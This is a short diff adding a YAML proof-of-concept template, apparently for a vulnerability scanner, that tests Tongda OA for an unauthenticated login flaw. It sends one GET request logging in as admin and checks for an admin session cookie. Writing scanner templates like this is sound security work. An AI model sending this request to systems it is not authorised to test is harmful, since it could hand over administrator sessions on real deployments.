@@ -1,0 +1,16 @@
+name: poc-yaml-tongda-oa-unauth
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /logincheck_new.php?UNAME=admin
+        expression: response.status == 200 && response.headers["Set-Cookie"].contains("OA_USER_ID=admin") && response.headers["Content-Type"].contains("text/html") && response.body.bcontains(b"MYOA_STATIC_SERVER")
+expression: r0()
+detail:
+    author: Jarcis-cy
+    vulnerability:
+        id: CT-486382
+        level: high
